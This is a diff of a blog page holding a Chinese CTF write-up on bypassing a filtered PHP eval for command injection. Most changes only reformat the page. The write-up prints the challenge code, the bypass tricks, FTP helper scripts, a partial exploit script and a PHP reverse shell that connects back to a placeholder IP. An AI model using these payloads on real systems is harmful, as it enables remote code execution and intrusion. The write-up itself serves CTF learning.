@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -104,83 +112,59 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>0x00 意外的题目</h2>
-
 <p>不知道是啥比赛还是啥啥啥</p>
-
 <p>朋友问我一个题目 http://l4w.pw/%F0%9F%A4%94/</p>
-
 <h2>0x01 看看代码</h2>
-
-<pre><code class="language-php">&lt;?php
+<pre><code class="php">&lt;?php
 // Connect to localhost:8888 to get the flag
-if($_GET[&#39;👉🏻&#39;] == &#39;👌🏻&#39;) die(phpinfo());
-$_ = $_GET[&#39;⁣&#39;];
+if($_GET['👉🏻'] == '👌🏻') die(phpinfo());
+$_ = $_GET['⁣'];
 highlight_file(__FILE__);
 
-if(preg_match(&quot;/[\w]{4,}/is&quot;,$_) || preg_match(&quot;/\[|\&quot;|&#39;|\||\^|~|\./is&quot;,$_)) // mình thích thì mình block hoy 👯
+if(preg_match(&quot;/[\w]{4,}/is&quot;,$_) || preg_match(&quot;/\[|\&quot;|'|\||\^|~|\./is&quot;,$_)) // mình thích thì mình block hoy 👯
      die(&quot;🙅&quot;); // 4cm is too much
 eval(substr($_,0,30));
 </code></pre>
 
 <p>没有参数什么鬼、目测是不可见字符、抓个包就出来了<strong>%e2%81%a3</strong></p>
-
 <p>三个\w绕过的黑科技,还限制30个字符，以及过滤一些符号</p>
-
 <p>看了看phpinfo发现shell_exec没有ban</p>
-
 <p>目测<strong>``</strong>命令执行</p>
-
 <h2>0x02 撸它</h2>
-
 <p>略过一堆失败、、、</p>
-
 <p><strong>发现黑科技</strong></p>
-
-<p><code>sh -c &quot;ec\ho 1&quot;</code> 是可以成功的，emmmmmm，原理不懂</p>
-
+<p><code>sh -c "ec\ho 1"</code> 是可以成功的，emmmmmm，原理不懂</p>
 <p><code>echo xxx &gt; xxx</code> 换行问题在sh中可以用<code>\</code>解决</p>
-
 <p>ip 用 十进制形式</p>
-
 <p>bash -i 反弹失败 用 php 来反弹</p>
-
 <p>服务器没有curl和wget，我反正用 <code>file_get_contents</code></p>
-
 <p>然后就没有然后了</p>
-
 <h2>0x03 Flag</h2>
-
 <p><strong>flag[happy_🌚_new_year]</strong></p>
-
 <h2>0x04 脚本</h2>
-
 <p><strong>ip2dec.sh</strong></p>
-
-<pre><code class="language-bash">ip2dec () {
+<pre><code class="bash">ip2dec () {
     local a b c d ip=$@
         IFS=. read -r a b c d &lt;&lt;&lt; &quot;$ip&quot;
-        printf &#39;%d\n&#39; &quot;$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))&quot;
+        printf '%d\n' &quot;$((a * 256 ** 3 + b * 256 ** 2 + c * 256 + d))&quot;
 }
 </code></pre>
 
 <p><strong>ftpd.py</strong></p>
-
 <p><code>pip install pyftpdlib</code></p>
-
-<pre><code class="language-python">from pyftpdlib.authorizers import DummyAuthorizer
+<pre><code class="python">from pyftpdlib.authorizers import DummyAuthorizer
 from pyftpdlib.handlers import FTPHandler
 from pyftpdlib.servers import FTPServer
 authorizer = DummyAuthorizer()
-authorizer.add_user(&#39;a&#39;, &#39;a&#39;, &#39;/root/&#39;, perm=&#39;elradfmw&#39;)
+authorizer.add_user('a', 'a', '/root/', perm='elradfmw')
 handler = FTPHandler
 handler.authorizer = authorizer
-server = FTPServer((&#39;0.0.0.0&#39;, 21), handler)
+server = FTPServer(('0.0.0.0', 21), handler)
 server.serve_forever()
 </code></pre>
 
 <p><strong>ftpdown.sh</strong></p>
-
-<pre><code class="language-bash">ftp -niv&lt;&lt;!
+<pre><code class="bash">ftp -niv&lt;&lt;!
 open [ip] [port]
 user a a
 mget x
@@ -188,14 +172,12 @@ bye
 !
 </code></pre>
 
-<p><strong>php_shell.php</strong><br>
-<code>php<br>
-&lt;?php $sock=fsockopen(&quot;xxx.xxx.xxx.xxx&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);<br>
-</code></p>
+<p><strong>php_shell.php</strong></p>
+<pre><code class="php">&lt;?php $sock=fsockopen(&quot;xxx.xxx.xxx.xxx&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
+</code></pre>
 
 <p><strong>exp.php</strong></p>
-
-<pre><code class="language-php">&lt;?php
+<pre><code class="php">&lt;?php
 error_reporting(0);
 
 function fuck1($u){
@@ -223,7 +205,6 @@ fuck1(&quot;ec\ho ! &gt;&gt;/tmp/0&quot;);
 fuck1(&quot;php -f /tmp/x&quot;);
 fuck1(&quot;rm /tmp/0&quot;);
 </code></pre>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2018/02/17/a_funny_command_injection.html" target="_blank">有意思的命令注入</a><br />
